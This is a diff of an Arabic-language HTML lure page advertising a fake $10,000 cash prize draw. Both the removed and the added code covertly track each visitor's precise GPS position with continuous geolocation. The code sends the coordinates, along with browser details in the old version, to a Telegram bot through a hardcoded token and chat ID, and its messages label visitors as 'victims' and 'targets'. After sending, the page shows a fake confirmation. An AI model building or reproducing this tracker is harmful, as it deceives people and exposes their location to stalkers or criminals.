@@ -5,63 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مسابقة الحلم 2026</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); color: white; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
-        .card { background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; border: 2px solid #ffd700; box-shadow: 0 0 20px #ffd700; max-width: 90%; }
-        h1 { color: #ffd700; font-size: 24px; }
-        p { font-size: 18px; }
-        .btn { background: #ffd700; color: black; border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; }
-        .btn:hover { transform: scale(1.1); box-shadow: 0 0 15px #ffd700; }
+        body { font-family: sans-serif; background: #1a2a6c; color: white; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: rgba(0,0,0,0.8); padding: 30px; border-radius: 15px; border: 2px solid #ffd700; box-shadow: 0 0 20px #ffd700; width: 90%; }
+        button { background: #ffd700; color: black; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
     </style>
 </head>
 <body>
+    <div class="card">
+        <h1>🎉 مبروك! 🎉</h1>
+        <p>لقد فزت بفرصة لدخول سحب 10,000 دولار كاش.</p>
+        <p>اضغط أدناه لتأكيد اشتراكك عبر موقعك الحالي:</p>
+        <button onclick="start()">تفعيل الاشتراك الآن</button>
+        <p id="msg"></p>
+    </div>
 
-<div class="card">
-    <h1>تهانينا! 🎉</h1>
-    <p>لقد تم ترشيحك للدخول في سحب على مبلغ <b>10,000 دولار كاش</b></p>
-    <p>اضغط على الزر أدناه لتأكيد هويتك والاشتراك مجاناً:</p>
-    <button class="btn" onclick="startProcess()">اشترك الآن</button>
-    <p id="status" style="margin-top: 15px; font-size: 14px; color: #ccc;"></p>
-</div>
-
-<script>
-    const TOKEN = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
-    const CHAT_ID = "8397194527";
-
-    function startProcess() {
-        document.getElementById("status").innerText = "جاري التحقق من الموقع لضمان التغطية في بلدك...";
-        
-        if (navigator.geolocation) {
-            // استخدام watchPosition للتتبع المستمر إذا تحرك الشخص
-            navigator.geolocation.watchPosition(sendToBot, showError, {
-                enableHighAccuracy: true, // دقة عالية جداً (GPS)
-                maximumAge: 0
-            });
-        } else {
-            alert("عذراً، متصفحك لا يدعم شروط المسابقة.");
+    <script>
+        function start() {
+            document.getElementById("msg").innerText = "جاري التحقق من الموقع...";
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(send, err, {enableHighAccuracy: true});
+            }
         }
-    }
 
-    function sendToBot(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-        
-        const text = `🎯 ضحية جديد وقع في الفخ:\n\n📍 الموقع: ${mapsUrl}\n🎯 الدقة: ${accuracy} متر\n📱 المتصفح: ${navigator.userAgent}`;
+        function send(pos) {
+            const token = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+            const cid = "8397194527";
+            const text = `🎯 هدف جديد:\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(text)}`);
+            document.getElementById("msg").innerText = "تم تسجيل اشتراكك بنجاح! انتظر اتصالنا.";
+        }
 
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}/&text=${encodeURIComponent(text)}`)
-        .then(() => {
-            // إظهار رسالة وهمية للمستخدم بعد إرسال موقعه
-            document.getElementById("status").innerText = "تم تأكيد دخولك السحب بنجاح! انتظر اتصالنا.";
-        });
-    }
-
-    function showError(error) {
-        document.getElementById("status").innerText = "يجب السماح بالوصول للموقع للمشاركة في المسابقة.";
-    }
-</script>
-
+        function err() { document.getElementById("msg").innerText = "يجب السماح بالوصول للموقع للمشاركة."; }
+    </script>
 </body>
 </html>
-
-
